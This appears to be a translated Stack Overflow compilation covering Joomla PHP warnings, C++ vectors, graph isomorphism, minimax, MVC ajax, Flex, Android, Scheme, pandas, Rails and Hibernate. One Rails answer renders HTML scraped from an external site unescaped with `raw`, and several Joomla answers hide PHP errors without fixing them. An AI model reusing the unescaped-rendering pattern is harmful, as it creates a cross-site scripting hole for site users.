Joomla 可能内置了很多功能，但它的安全历史远非典型。您是否安装了最新版本的 Joomla？如果没有，那么现在就这样做。如果您仍然收到警告，[请将其报告为错误](http://forum.joomla.org/viewforum.php?f=199)。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-03-07T03:36:56.713

我遇到了同样的问题，我的配置是共享主机服务器上的 Joomla 1.5。

然而，托管服务提供商将 PHP 版本从 5.2 升级到 5.4。Joomla 1.5 似乎与 PHP 5.4 版本不兼容，所以不要抑制你的错误（这当然不是一个好主意），而是尝试在你的共享主机/或专用主机上调整 PHP 版本......

干杯。如果有警告不要隐藏它 - 解决它......！！！:)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-12-31T09:22:08.880

难以置信的。如果您要做的只是隐藏消息，那么您显然不是编码员。消息的存在是有原因的。在您的组件中找到该函数并将静态一词放在它前面。函数导入（更改为静态函数导入（

问题解决了。不隐藏

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-01-22T00:37:02.643

You can solve the problem only if you return to php 5.2 or you will change the new version to work with J 1.5

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-20T17:05:28.490

您将在（对于 linux 的）/etc/php.ini 中找到它

试试这个：替换 display_errors = On --> display_errors = Off

error_reporting = E_ALL | E_STRICT --> error_reporting = E_ALL & ~E_NOTICE

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-04-20T17:07:23.153

如果您的 joomla 根目录中没有 php.ini 文件，请在使用 Cpanel 时创建一个新的 phi.ini 文件（创建一个新文件）并使用它

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-07-16T18:53:06.557

将您的 php 版本切换到 php 5.3

还要更改您的 joomla 配置文件 (configuration.php) 中的 error_reporting

```
var $error_reporting = '6143'; 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2018-09-11T22:26:56.953

您可以为管理员和前端粘贴此代码 index.php。

// 设置这是一个父文件的标志

```
 define( '_JEXEC', 1 );

error_reporting( E_ERROR | E_PARSE | E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_COMPILE_WARNING ); 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2018-04-04T07:10:39.130

解决和超越错误的两件事 1\. 在配置中将错误报告设置为 none 2\. 您的 joomla 版本可能是旧的，

* * *

## 回答 #11

> 赞同：-1
> 
> 时间：2014-02-28T06:47:46.600

```
Strict Standards: Non-static method JLoader::import() should not be called
statically in /home/chinfote/public_html/libraries/joomla/import.php on line 29 
```

你会发现它在`server.. /etc/php.ini`

试试这个：替换`display_errors = On`为 `display_errors = Off`

* * *

## 回答 #12

> 赞同：-1
> 
> 时间：2013-04-21T08:21:33.920

一些主机不允许从文件夹的根目录读取 PHP.ini。但如果他们这样做，您可能需要为您的 /administrator 文件夹添加另一个。这至少可以让你进入后端。如果没有，您可以通过 htaccess 文件设置这些 PHP 参数。可能需要更多的谷歌搜索，但应该有大量的信息......

* * *

## 回答 #13

> 赞同：-1
> 
> 时间：2015-09-17T13:13:34.097

只需在 php.ini 文件中执行以下操作：

```
;error_reporting = E_ALL | E_STRICT 
```

* * *

## 回答 #14

> 赞同：-2
> 
> 时间：2013-12-22T19:23:51.110

您可以将这些行添加到您的 .htacces 文件中；如果您唯一的问题是显示错误。

```
php_flag display_startup_errors off
php_flag display_errors off
php_flag html_errors off
php_value docref_root 0
php_value docref_ext 0 
```

# c++ - 过早达到最大向量大小

> ID：16122936
> 
> 赞同：1
> 
> 时间：2013-04-20T17:03:51.660
> 
> 标签：c++, stdvector

我正在测试我可以在我的计算机上制作多大的一维矢量。为此，我使用以下 MWE：

```
#include <iostream>
#include <vector>

using namespace std;

int main()
{
    vector<double> vec;

    const unsigned long long lim = 1E8;
    for(unsigned long long i=0; i<lim; i++)
    {
        vec.push_back(i);
    }
    cout << vec.max_size() << endl; //outputs 536.870.911 on my 32-bit system

    return 0;
} 
```

如图所示，`max_size()`我的`std::vector`系统上可以包含 536.870.911 个元素。但是，当我运行上面的 MWE 时，我得到了错误

`terminate called after throwing an instance of 'std::bad_alloc' what(): std::bad_alloc`

我的电脑有 2GB 内存，但 1E8 整数只占用 381MB，所以我不明白为什么会`bad_alloc`出错？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-20T17:21:36.037

`1E8 = 100000000``sizeof(double) = 8`[在几乎所有系统中]，所以 762MB 。现在，如果我们从一个包含 16 个元素的向量开始，并且每次“超出”当前大小时它都会翻倍，以获得 1E8 个元素的空间，我们得到以下序列：

16, 32, 64, 128, 256, ... 67108864（64M 条目），下一个是 134217728，占用 8 * 128M = 1GB，并且您还必须有空间容纳 64M * 8 = 512MB 的块同时，从中复制旧数据。鉴于在 32 位进程中没有完整的 2GB 可用空间，因为一些内存已用于堆栈、程序代码、DLL 和其他类似的东西，因此找到一个 1GB 的连续空间区域可能会很困难。已占用（超过）512MB。

“我不能像我记忆中想象的那样适应”的问题并不是一个不寻常的问题。

一种解决方案是使用`std::vector::reserve()`预先分配足够的空间。这更有可能奏效，因为您只需要一个大分配，而不是两个 - 而且它也不需要超过 762MB，因为它被分配到正确的大小，而不是一些任意的“两倍于当前是”。

# graph - 如何检查两个带有 LABELED 顶点的图是否同构？

> ID：16122943
> 
> 赞同：2
> 
> 时间：2013-04-20T17:04:40.097
> 
> 标签：graph, isomorphism

例如，假设我有一个图 G，它包含所有蓝色节点和一个红色节点。我还有一个图 F，它有一个全蓝色和一个红色节点。

我可以运行什么算法来验证这两个图关于它们的彩色节点是同构的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-16T20:39:31.233

我已经尝试创建多项式图同构算法，虽然我还没有创建一个被证明在每种情况下都是多项式的算法，但我想出的一个算法特别适合这个目的。它基于 DFA 最小化算法（具体算法是[http://en.wikipedia.org/wiki/DFA_minimization#Hopcroft.27s_algorithm](http://en.wikipedia.org/wiki/DFA_minimization#Hopcroft.27s_algorithm)；您可能想从其他地方找到描述，因为很难理解维基百科）。

最初的算法是通过根据度数将顶点组织成不同的组来初始化的（一组用于度数为 1 的顶点，一组用于度数为 2 的顶点，等等）。出于您的目的，您需要根据度数和标签将顶点组织成组；这将确保如果两个节点具有不同的标签，则不会配对。每个图都应该有自己的包含这些组的结构。检查两个图的组集合；两个图应该有相同数量的组，并且对于一个图中的每个组，另一个图中应该有一个组包含相同数量的相同度数和标签的顶点。如果不是这种情况，则图不是同构的。

在主算法的每次迭代中，您应该为下一步将使用的顶点组的两个图中的每一个生成一个新的数据结构。对于每个组，为与所讨论的顶点相邻的顶点对应的组索引/ID 的每个顶点生成一个列表（包括此列表中的重复组）。检查每个组以查看每个包含的顶点的排序组索引/ID 列表是否相同。如果是这种情况，请在下一步的组结构中创建该组的未修改副本。如果不是这种情况，那么对于该组中的每个组索引/ID 的唯一列表，为生成该列表的原始组中的顶点创建一个新组，并将这个新组添加到下一步的组结构中。如果在给定的迭代中不细分任一图的任何组，请停止运行该算法的主要部分。如果您至少细分一个组，则需要再次检查以确保两个图的组结构彼此对应。此检查将类似于在算法初始化结束时执行的检查（您甚至可以对两者使用相同的函数）。如果此检查失败，则图不是同构的。如果检查通过，则丢弃/释放当前组结构并使用新创建的组开始下一次迭代。此检查将类似于在算法初始化结束时执行的检查（您甚至可以对两者使用相同的函数）。如果此检查失败，则图不是同构的。如果检查通过，则丢弃/释放当前组结构并使用新创建的组开始下一次迭代。此检查将类似于在算法初始化结束时执行的检查（您甚至可以对两者使用相同的函数）。如果此检查失败，则图不是同构的。如果检查通过，则丢弃/释放当前组结构并使用新创建的组开始下一次迭代。

为了使确定“对应组”的过程更容易，我强烈建议使用可预测的方案将组添加到结构中。例如，如果在初始化时按（度，标签）顺序添加组，按索引升序细分组，并根据组索引列表的顺序（即按第一个列出的索引排序，然后是第二个等），那么两个组结构之间的对应组将始终具有相同的索引，这使得跟踪哪些组彼此对应的过程*变得更加*容易。

如果算法完成时所有组都包含 3 个或更少的顶点，则图是同构的（对于包含 2 个或 3 个顶点的相应组，任何顶点配对都是有效的）。如果不是这种情况（这总是发生在所有节点都具有相同度数和标签的图上，有时会发生在具有该属性的子图上），那么这些图尚未确定为同构或非同构。要区分这两种情况，请选择第一个图的最大组的任意节点并将其分成自己的组。然后，对于另一个图的最大组的每个节点，尝试再次运行算法，将该节点分成自己的组。在本质上，您正在从第一个图中选择一个未配对的节点，并通过猜测和检查将其配对到第二个图中仍然是合理配对的每个节点。如果任何分叉迭代返回同构，则图是同构的。如果它们都没有，则图不是同构的。

对于一般情况，该算法是多项式的。在极端情况下，算法可能是指数的。是否是这种情况与算法在图输入和节点选择的最坏情况下被迫分叉的频率有关，我在尝试设置有用的界限时遇到了困难。例如，虽然算法在比较两个完整图时在每一步都分叉，但该树的每个分支都会产生同构；因此，在这种情况下，算法在多项式时间内返回，即使遍历整个执行树将需要指数时间，因为仅遍历执行树的一个分支需要多项式时间。

无论如何，这个算法应该可以很好地满足您的目的。我希望我对它的解释是可以理解的；如果没有，我可以尝试提供处理简单案例的算法示例或将其表示为伪代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-03-19T15:04:43.520

几年前，我为这个问题（带有标签的图同构）创建了一个简单而灵活的算法。

我将它命名为“Powerhash”，创建算法需要两个见解。第一个是幂迭代图算法，也用于PageRank。第二个是能够用我们想要的任何东西替换幂迭代的内部阶跃函数。我用一个函数替换了它，该函数在每次迭代和每个节点上执行以下操作：

*   对节点邻居的哈希值（来自上一次迭代）进行排序
*   散列连接的排序散列
*   用新计算的哈希替换节点的哈希

第一步，节点的散列受到其直接邻居的影响。第二步，一个节点的哈希值受到距离它 2 跳的邻居的影响。在第 N 步，节点的哈希值将受到其周围 N 跳的邻域影响。所以你只需要继续运行 N = graph_radius 步骤的 Powerhash。最终，图中心节点的哈希值将受到整个图的影响。

要生成最终哈希，请对最后一步的节点哈希进行排序并将它们连接在一起。之后，您可以比较最终的哈希值来确定两个图是否同构。如果您有标签，则将它们（在第一次迭代中）添加到您为每个节点计算的内部哈希中。

有关这方面的更多信息，您可以在此处查看我的帖子：

[https://plus.google.com/114866592715069940152/posts/fmBFhjhQcZF](https://plus.google.com/114866592715069940152/posts/fmBFhjhQcZF)

上面的算法是在“madIS”函数关系数据库中实现的。你可以在这里找到算法的源代码：

[https://github.com/madgik/madis/blob/master/src/functions/aggregate/graph.py](https://github.com/madgik/madis/blob/master/src/functions/aggregate/graph.py)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-20T17:12:59.160

只是检查; 你的意思是严格的图同构还是别的什么？同构图具有相同的邻接关系（即，如果节点 A 在一个图中与节点 B 相邻，则节点 g(A) 在另一个图中与节点 g(B) 相邻，这是将变换 g 应用于第一个图中的结果...）如果您只是想检查一个图是否具有与另一个图相同的类型和节点数，那么您可以比较计数。

# algorithm - Minimax 和井字游戏 - 我的算法正确吗？

> ID：16122946
> 
> 赞同：1
> 
> 时间：2013-04-20T17:05:03.210
> 
> 标签：algorithm, artificial-intelligence, tic-tac-toe, minimax

我为 TTT 实现了一个极小极大算法。当我让 AI 玩家迈出第一步时，它会将所有可能移动的极小最大值评估为 0。这意味着它可以选择网格上的任何方格作为第一步。但是，任何井字游戏指南都会告诉您，在迈出第一步时选择角落或中心方块是更好的选择，因为获胜的机会更高。

为什么我的算法没有反映这一点？

编辑：澄清一下，我想问的是：这是极小极大算法的限制还是我的实现不正确？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T17:17:21.180

您的算法不必反映这一点：如果您尝试所有起始位置，您会发现角落和中心为您提供比其他单元更多的获胜路径。

由于井字游戏缺乏复杂性，极小极大游戏可以从第一步开始一直向前看。随着游戏的进行，可用动作的数量会迅速减少，因此完整的搜索很快就会完成。

随着更复杂的游戏（奥赛罗、跳棋、国际象棋），所谓的“开局”变得更加重要。游戏开始时可用的步数是巨大的，因此传统的方法是从开局的“书”中挑选一个棋子，并在前三到六场比赛中保持预先计算的“书本”。不考虑书外的移动，在基本保持不变的移动上节省了大量的 CPU。

# c# - 使用 jquery ajax 提交表单

> ID：16122949
> 
> 赞同：15
> 
> 时间：2013-04-20T17:05:17.977
> 
> 标签：c#, jquery, asp.net-mvc

我正在尝试学习 MVC，我想做的一件事是将表单提交给我的控制器中的一个动作，这个动作将返回提交的数据。听起来很简单，但我已经尝试了几个小时没有任何成功。我的观点：

```
 @using (Html.BeginForm("BlogComment","Blog"))
 {
     @Html.ValidationSummary(true)
    <legend class="AddAComment">Add a comment</legend>

    <div class="commentformwrapper">

        <div class="editor-text">
        <span class="editor-label">User Name:</span>
        </div>

        <div class="editor-text">
        <input type="text" id="username" />
        </div>

        <div class="editor-text">
        <textarea id="comment" rows="6" cols="23"></textarea>
        </div>

        <div class="editor-field">
        <input type="hidden" id="hiddendate" />
        </div>

        <input type="submit" id="submit" value="Create" />

    </div>
} 
```

我的控制器：

```
[HttpPost]   
public ActionResult CommentForm(Comment comment)
{
    Comment ajaxComment = new Comment();
    ajaxComment.CommentText = comment.UserName;
    ajaxComment.DateCreated = comment.DateCreated;
    ajaxComment.PostId = comment.PostId;
    ajaxComment.UserName = comment.UserName;

    mRep.Add(ajaxComment);
    uow.Save();
    //Get all the comments for the given post id

    return Json(ajaxComment);
} 
```

和我的js：

```
 $(document).ready(function () {

        $('form').submit(function () {

            $.ajax({
                url: '@Url.Action("CommentForm")',
                type: "POST",
                dataType: "json",
                contentType: "application/json; charset=utf-8",
                data: {
                    PostId: $('.postid').val(),
                    UserName: $('#username').val(),
                    DateCreated: new Date(),
                    CommentText: $('#comment').val()
                },
                success: function (result) {

                    alert("success " + result.UserName);
                },
                error: function (result) {
                    alert("Failed");
                }
            });
          return false;
        });
    }); 
```

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2013-04-20T18:09:07.247

仅供参考，您无需编写任何客户端代码即可。

要在 MVC 中成功使用 ajax 方法，您需要执行以下操作。将此键添加到 web.config 中的 appsettings：

```
 <appSettings>
    <add key="UnobtrusiveJavaScriptEnabled" value="true" />
  </appSettings> 
```

以及包含不显眼的 ajax 脚本：

```
<script src="/Scripts/jquery.unobtrusive-ajax.min.js" type="text/javascript"></script> 
```

然后在表单周围创建 div 容器并用 Ajax.BeginForm 替换 Html.BeginForm

```
<div id="ajaxReplace">
@using (Ajax.BeginForm("BlogComment", "Blog", null, new AjaxOptions { UpdateTargetId = "ajaxReplace", OnSuccess = "doFunctionIfYouNeedTo", OnFailure = "ShowPopUpErrorIfYouWant" }))
 {
 @Html.ValidationSummary(true)
        <legend class="AddAComment">Add a comment</legend>

        <div class="commentformwrapper">

            <div class="editor-text">
            <span class="editor-label">User Name:</span>
            </div>

            <div class="editor-text">
            <input type="text" id="username" />
            </div>

            <div class="editor-text">
            <textarea id="comment" rows="6" cols="23"></textarea>
            </div>

            <div class="editor-field">
            <input type="hidden" id="hiddendate" />
            </div>

            <input type="submit" id="submit" value="Create" />

        </div>

    }
</div> 
```

然后在您的控制器中，您将返回如下内容：

```
return PartialView(ajaxComment); 
```

这将节省您维护脚本以手动执行此操作，并将引导您按预期使用框架。它还将帮助您进行数据注释验证以及与之相关的所有有趣的东西，

我希望这在某种程度上有所帮助。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2013-04-21T12:31:42.973

尝试这个：

该模型

```
public class Comment
{
    public string CommentText { get; set; }
    public DateTime? DateCreated { get; set; }
    public long PostId { get; set; }
    public string UserName { get; set; }
} 
```

视图和js

```
@model SubmitMvcForWithJQueryAjax.Models.Comment

@using (Html.BeginForm("BlogComment","Blog"))
{
    @Html.ValidationSummary(true)
    <legend class="AddAComment">Add a comment</legend>

    <div class="commentformwrapper">

        <div class="editor-text">
        <span class="editor-label">User Name:</span>
        </div>

        <div class="editor-text">
            @Html.EditorFor(m => m.UserName)
        </div>

        <div class="editor-text">
            @Html.TextAreaFor(m => m.CommentText, new { rows="6", cols="23"} )
        </div>

        <div class="editor-field">
             @Html.HiddenFor(m => m.DateCreated)        
        </div>

         <div class="editor-field">
             @Html.HiddenFor(m => m.PostId)          
        </div>

        <input type="submit" id="submit" value="Create" />

    </div>

}

<script type="text/javascript">
    $(document).ready(function () {

        $('form').submit(function () {
            var serializedForm = $(this).serialize();                       
            $.ajax({
                url: '@Url.Action("CommentForm")',
                type: "POST",                                       
                data: serializedForm,
                success: function (result) {

                    alert("success " + result.UserName);
                },
                error: function (result) {
                    alert("Failed");
                }

            });
            return false;
        });
    });

</script> 
```

控制器

```
public class CommentController : Controller
{
    //
    // GET: /Comment/

    public ActionResult Index()
    {
        return View(new Comment());
    }

    [HttpPost]
    public ActionResult CommentForm(Comment comment)
    {
        Comment ajaxComment = new Comment();
        ajaxComment.CommentText = comment.UserName;
        ajaxComment.DateCreated = comment.DateCreated ?? DateTime.Now;
        ajaxComment.PostId = comment.PostId;
        ajaxComment.UserName = comment.UserName;

        //mRep.Add(ajaxComment);
        //uow.Save();
        //Get all the comments for the given post id

        return Json(ajaxComment);

    }

} 
```

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2013-04-20T17:11:55.513

基本上你是直接传递 javascript 对象文字。因此，在将数据传递给控制器​​之前，它必须采用`JSON`格式（因为您已指定 application/json。请参阅您的 $.ajax 调用）。
所以，你缺少 JSON.stringify()

```
data: JSON.stringify({
                        PostId: $('.postid').val(),
                        UserName: $('#username').val(),
                        DateCreated: new Date(),
                        CommentText: $('#comment').val()
                    }), 
```

或者

```
var someObj = {
            PostId: $('.postid').val(),
            UserName: $('#username').val(),
            DateCreated: new Date(),
            CommentText: $('#comment').val()
        };

         $.ajax({
            /// your other code
            data: JSON.stringify(someObj),
            // your rest of the code

        }); 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-04-20T17:08:31.153

代替

```
data: {
          PostId: $('.postid').val(),
          UserName: $('#username').val(),
          DateCreated: new Date(),
          CommentText: $('#comment').val()
      }, 
```

尝试

```
$('form').submit(function () {
    var obj = {
        PostId: $('.postid').val(),
        UserName: $('#username').val(),
        DateCreated: new Date(),
        CommentText: $('#comment').val()
    };

    $.ajax({
        ...,
        data: JSON.stringify(obj),
        ...,
    });

    return false;
}); 
```

在将数据发送到服务器之前，您必须将其转换为字符串。并`JSON.stringify`完成这项工作

# xml - Adobe Flex 动作脚本 - 响应对象

> ID：16122951
> 
> 赞同：1
> 
> 时间：2013-04-20T17:05:32.520
> 
> 标签：xml, actionscript-3, apache-flex, actionscript

我有 Adob​​e Flex 应用程序，来自 cgi 脚本，我收到响应对象为 XML

```
var loader:URLLoader = new URLLoader();
loader.dataFormat = URLLoaderDataFormat.TEXT;
loader.addEventListener(Event.COMPLETE, httpResult);

loader.load(request);

private function httpResult(e:Event):void
{   
    Alert.show("XML: " + new XML(e.target.data));
    var result:XML = XML(e.target.data) as XML;
    Alert.show("hasOwnProperty(result): " + result.hasOwnProperty("result"));
} 
```

以下是我在警报“XML：”中的响应对象

```
<result>
    <update>insert</update>
</result> 
```

但是警报“hasOwnProperty(result):”显示“False”

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T17:41:32.683

`<result>`是 XML 的[根元素](http://en.wikipedia.org/wiki/Root_element)。
尝试以下操作：

```
private function httpResult(e:Event):void
{   
    var result:XML = XML(e.target.data);
    Alert.show("has update property: " + result.hasOwnProperty("update"));
} 
```

* * *

**编辑**：为了清楚起见，请查看以下代码：

```
var xml:XML = XML("<result><update>insert</update></result>");

trace("XML:", xml);
trace("result:", xml.hasOwnProperty("result"));
trace("update:", xml.hasOwnProperty("update")); 
```

控制台中的输出将如下所示：

```
XML: <result>
  <update>insert</update>
</result>
result: false
update: true 
```

# camera - 人脸检测在 Nexus7 4.2 上不起作用

> ID：16122952
> 
> 赞同：3
> 
> 时间：2013-04-20T17:05:34.353
> 
> 标签：camera, face-detection, nexus-7, android-4.2-jelly-bean

我正在构建一个 android 相机应用程序，并使用 FaceDetectionListener。我的应用在 XperiaZ - LgoptimusBlack- GalaxyNexus4 和其他一些设备上没有问题。但是使用 Google Nexus 7 它给了我一个错误：

```
 java.lang.IllegalArgumentException: invalid face detection type=0 
```

当我打电话时

```
 params.getMaxNumDetectedFaces() 
```

它给了我 0，这意味着我的相机硬件可以在预览期间使用 FaceDetectionListener 识别 0 个面孔。我试过用Nexus7的FaceUnlocker，效果很好，说明它不是相机硬件。我用谷歌搜索并阅读了同样的问题，没有任何答案。我已经尝试了一些带有面部检测的互联网样本，但在 Nexus7 上也是同样的问题！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-04-22T22:57:23.397

不幸的是，这是一个平台[问题](https://code.google.com/p/google-glass-api/issues/detail?id=282)。添加*try{ }catch( ){ }*块将不起作用。某些设备可能只需要软件升级即可获得修复。

同时，对于那些尚未修复平台的设备，您可能需要封装*FaceDetector API* ：http : [//developer.android.com/reference/android/media/FaceDetector.html](http://developer.android.com/reference/android/media/FaceDetector.html)

（基于位图是，但可以完成识别面部位置的任务）。

# object - 在 Scheme 中克隆对象

> ID：16122953
> 
> 赞同：2
> 
> 时间：2013-04-20T17:05:39.077
> 
> 标签：object, racket, cloning

我试图在 Scheme 中克隆一个对象，比如

```
(define o1
    (new cl%
        [a 1] [b 2])) 
```

接着

```
(define o2 o1) 
```

当我使用设置！在 o1 上，它与 o1 一起改变了 o2。但我想要具有相同属性的独立克隆。我应该怎么办？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T17:11:40.500

写一个复制方法。然后：

```
(define o2 (copy-cl%-thingy o1)) 
```

像这样：

```
(define (new aval bval)
  `(cl% [a ,aval] [b ,bval]))
(define cl%-aval caddr)
(define cl%-bval cadddr)

(define (copy-cl%-thingy o)
  (new (cl%-aval o) (cl%-bval o))) 
```

# python - 如何从 pandas DataFrame 中检索所有索引

> ID：16122955
> 
> 赞同：0
> 
> 时间：2013-04-20T17:05:47.103
> 
> 标签：python, indexing, pandas

如何从 pandas 0.10.1 DataFrame 中检索所有索引？

我试图在文档和网络上找到，但至少半小时后仍然没有任何结果。

谢谢， 斯拉瓦

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-20T22:32:10.653

[正如 Jeff 提到的，您将在官方文档](http://pandas.pydata.org/pandas-docs/dev/10min.html#viewing-data)中找到此信息。例子：

```
>>> df = DataFrame(np.random.rand(3,2), index = list('abc'), columns=list('df'))
>>> df
     d           f
a    0.629197    0.921025
b    0.534993    0.018760
c    0.156801    0.298251 
```

指数：

```
>>> df.index
Index([a, b, c], dtype=object) 
```

列：

```
>>> df.columns
Index([d, f], dtype=object) 
```

# html - 在 Rails 中输出一个包含 html 代码的变量 Ruby on Rails

> ID：16122957
> 
> 赞同：2
> 
> 时间：2013-04-20T17:06:22.080
> 
> 标签：html, ruby-on-rails, ruby, output

我对 ruby​​ 和 rails 的输出有一点问题。我仍然是 Rails 的初学者，所以解决方案可能很简单，我只是看不到它。

我正在尝试解析一个网站并在我自己的网站上发布一些源代码。问题：它总是将整个源代码作为文本输出，而不是解释 html 代码。我该如何改变呢？

代码：

```
page = Nokogiri::HTML(open("https://www.google.ch/search?client=ubuntu&channel=fs&q=google&ie=utf-8&oe=utf-8&redir_esc=&ei=WMpyUfSWEuz07AaTioCwDw"))     

source = page.css('div#_css0')

<%=  page %> 
```

结果：

[http://postimg.org/image/dsaib9lx3/](http://postimg.org/image/dsaib9lx3/)

我希望它看起来像：

[http://postimg.org/image/z9qlhoef5/](http://postimg.org/image/z9qlhoef5/)

感谢您的任何建议！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T19:12:38.573

你应该`raw`在erb中使用。它实际上相当于在其上调用 html_safe，但是，就像 h 一样，是在 helper 上声明的，所以它只能在控制器和视图上使用。

```
page = Nokogiri::HTML(open("https://www.google.ch"))
<%= raw page %> 
```

或者

```
<%= raw Nokogiri::HTML(open("http://www.google.com")) %> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-20T17:29:54.540

在 Rails 视图中，每个字符串内容都会被转义，除非您使用`html_safe`( [docs](http://api.rubyonrails.org/classes/String.html#method-i-html_safe) )

# hibernate - java.sql.SQLException：参数索引超出范围（3 > 参数个数，即 2）

> ID：16122958
> 
> 赞同：7
> 
> 时间：2013-04-20T17:06:43.473
> 
> 标签：hibernate, hibernate-mapping

我有一个表“AuthorFollow”，其中包含“authorId”和“userId”的复合键，它们分别是“AuthorInfo”和“UserInfo”表中的主键。

我正在尝试将“AuthorFollow”的对象保存在数据库中（我使用的是 mysql）。但是，我得到了错误：

```
org.hibernate.exception.GenericJDBCException: could not insert: [com.pojo.hibernate.AuthorFollow]
.
.
.
Caused by: java.sql.SQLException: Parameter index out of range (3 > number of parameters, which is 2).
.
.
. 
```

我正在尝试保存对象的代码是：

```
Transaction transaction = hibernateTemplate.getSessionFactory().getCurrentSession().beginTransaction();
    try {
        AuthorFollow authorFollow = new AuthorFollow();
        authorFollow.setAuthorId(authorInfo.getAuthorId());
        authorFollow.setUserId(userInfo.getUserId());
        authorFollow.setAuthorInfoByAuthorId(authorInfo);
        authorFollow.setUserInfoByUserId(userInfo);

        authorInfo.getAuthorFollowsByAuthorId().add(authorFollow);
        userInfo.getAuthorFollowsByUserId().add(authorFollow);

        updateObject(authorInfo);
        updateObject(userInfo);

        transaction.commit();
        return true;
    } catch (Exception e) {
        e.printStackTrace();
        transaction.rollback();
        return false;
    } 
```

映射文件（这些映射由 IntellijIdea 自动生成）： AuthorFollow.hbm.xml ：

```
<hibernate-mapping>
    <class name="com.pojo.hibernate.AuthorFollow" table="author_follow" catalog="book">
    <composite-id mapped="true" class="com.pojo.hibernate.AuthorFollowPK">
        <key-property name="userId" column="user_id"/>
        <key-property name="authorId" column="author_id"/>
    </composite-id>
    <many-to-one name="authorInfoByAuthorId" class="com.pojo.hibernate.AuthorInfo">
        <column name="author_id" not-null="true"/>
    </many-to-one>
    <many-to-one name="userInfoByUserId" class="com.pojo.hibernate.UserInfo">
        <column name="user_id" not-null="true"/>
    </many-to-one>
    </class>
</hibernate-mapping> 
```

AuthorInfo.hbm.xml（仅显示 AuthorFollow 的映射）：

```
<set name="authorFollowsByAuthorId" inverse="true">
        <key>
            <column name="author_id" not-null="true"/>
        </key>
        <one-to-many not-found="ignore" class="com.pojo.hibernate.AuthorFollow"/>
    </set> 
```

UserInfo.hbm.xml（仅显示 AuthorFollow 的映射）：

```
<set name="authorFollowsByUserId" inverse="true">
        <key>
            <column name="user_id" not-null="true"/>
        </key>
        <one-to-many not-found="ignore" class="com.pojo.hibernate.AuthorFollow"/>
    </set> 
```

更新 ：

```
Hibernate: select userinfo0_.user_id as user1_21_, userinfo0_.first_name as first2_21_, userinfo0_.last_name as last3_21_, userinfo0_.user_gender as user4_21_, userinfo0_.user_img as user5_21_, userinfo0_.user_birthdate as user6_21_, userinfo0_.user_occupation as user7_21_, userinfo0_.user_qualification as user8_21_, userinfo0_.user_postal_code as user9_21_, userinfo0_.user_address as user10_21_, userinfo0_.user_city as user11_21_, userinfo0_.user_contact as user12_21_, userinfo0_.user_balance as user13_21_, userinfo0_.user_website as user14_21_, userinfo0_.email_verified as email15_21_, userinfo0_.email_id as email16_21_ from book.user_info userinfo0_ where userinfo0_.email_id=?
Hibernate: select authorinfo0_.author_id as author1_3_0_, authorinfo0_.author_name as author2_3_0_, authorinfo0_.author_pen_name as author3_3_0_, authorinfo0_.author_gender as author4_3_0_, authorinfo0_.author_description as author5_3_0_, authorinfo0_.author_blog_link as author6_3_0_, authorinfo0_.author_img as author7_3_0_, authorinfo0_.author_lives as author8_3_0_, authorinfo0_.author_born as author9_3_0_, authorinfo0_.author_died as author10_3_0_, authorinfo0_.author_notable_works as author11_3_0_ from book.author_info authorinfo0_ where authorinfo0_.author_id=?
Hibernate: select userinfo0_.user_id as user1_21_, userinfo0_.first_name as first2_21_, userinfo0_.last_name as last3_21_, userinfo0_.user_gender as user4_21_, userinfo0_.user_img as user5_21_, userinfo0_.user_birthdate as user6_21_, userinfo0_.user_occupation as user7_21_, userinfo0_.user_qualification as user8_21_, userinfo0_.user_postal_code as user9_21_, userinfo0_.user_address as user10_21_, userinfo0_.user_city as user11_21_, userinfo0_.user_contact as user12_21_, userinfo0_.user_balance as user13_21_, userinfo0_.user_website as user14_21_, userinfo0_.email_verified as email15_21_, userinfo0_.email_id as email16_21_ from book.user_info userinfo0_ where userinfo0_.user_id=?
Hibernate: select authorfoll0_.author_id as author2_3_1_, authorfoll0_.user_id as user1_1_, authorfoll0_.author_id as author2_1_, authorfoll0_.user_id as user1_1_0_, authorfoll0_.author_id as author2_1_0_ from book.author_follow authorfoll0_ where authorfoll0_.author_id=?
Hibernate: select authorfoll0_.user_id as user1_21_1_, authorfoll0_.user_id as user1_1_, authorfoll0_.author_id as author2_1_, authorfoll0_.user_id as user1_1_0_, authorfoll0_.author_id as author2_1_0_ from book.author_follow authorfoll0_ where authorfoll0_.user_id=?
Hibernate: insert into book.author_follow (author_id, user_id) values (?, ?) 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-23T06:52:12.417

Hibernate 的错误信息不明确，很难看出问题出在哪里。这就是我给你+1的原因。

您的错误是：在映射中`AuthorFollow`不正确。你映射`author_id`和`user_id`两次。Hibernate 无法处理这个问题。在插入中，计算参数时失败。每列应该只映射一次（除非一个映射是只读的，但这种特殊情况对您的问题不感兴趣）。

有两种解决方案：

1）简单的解决方案：使用 ids 而不是`AuthorInfo`和`UserInfo`对象：

```
<hibernate-mapping>
  <class name="com.pojo.hibernate.AuthorFollow" table="author_follow" catalog="book">
    <composite-id mapped="true" class="com.pojo.hibernate.AuthorFollowPK">
      <key-property name="userId" column="user_id"/>
      <key-property name="authorId" column="author_id"/>
    </composite-id>
  </class>
</hibernate-mapping> 
```

